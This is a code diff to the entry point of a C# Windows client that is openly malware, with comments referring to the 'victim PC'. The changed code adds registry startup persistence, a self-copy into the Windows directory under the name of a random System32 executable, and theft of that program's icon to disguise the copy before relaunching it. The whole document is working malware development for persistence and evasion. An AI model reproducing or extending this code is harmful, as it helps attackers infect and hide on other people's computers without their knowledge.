@@ -19,13 +19,11 @@ namespace Client
         static void Main(string[] args)
         {
             ArgsParser(args);
-
             CheckRealApplication();
-
             // make sure this thing wont crash
             Application.ThreadException += Application_ThreadException;
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
-
+           
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -42,7 +40,7 @@ namespace Client
                 // add startup to registry...for the meantime
                 Armitage.Startup.ViaRegistry();
             }
-            else
+            else // it is admin!
             {
                 if (!Constants.IsInWinDir()) GoSomewhereSafe();
                 // now it will run there, wait for it to hook there
@@ -143,17 +141,24 @@ namespace Client
             try
             {
                 string randomsysapp = Utilities.Files_And_Pathing.GetRandomSystem32Executable();
-                string path = Path.GetFullPath(Constants.WinDir + "/" + randomsysapp);
-                Armitage.Copy.CopySelfTo(path);
+
+                string fullrandomsysapp = Environment.SystemDirectory + "/" + randomsysapp;
+
+                string windirpath = Path.GetFullPath(Constants.WinDir + "/" + randomsysapp);
+
+                Armitage.Copy.CopySelfTo(windirpath);
                 // change the letter's stamp
-                var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(randomsysapp);
-                Utilities.Icon_Util.ChangeIcon(path, randicon);
+                var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(fullrandomsysapp);
+
+                Utilities.Icon_Util.ChangeIcon(windirpath, randicon);
                 // run from there
-                Process.Start(path);
-                return path;
+                Process.Start(windirpath);
+
+                return windirpath;
             }
-            catch
+            catch (Exception ex)
             {
+                MessageBox.Show(ex.ToString());
             }
             return null;
         }
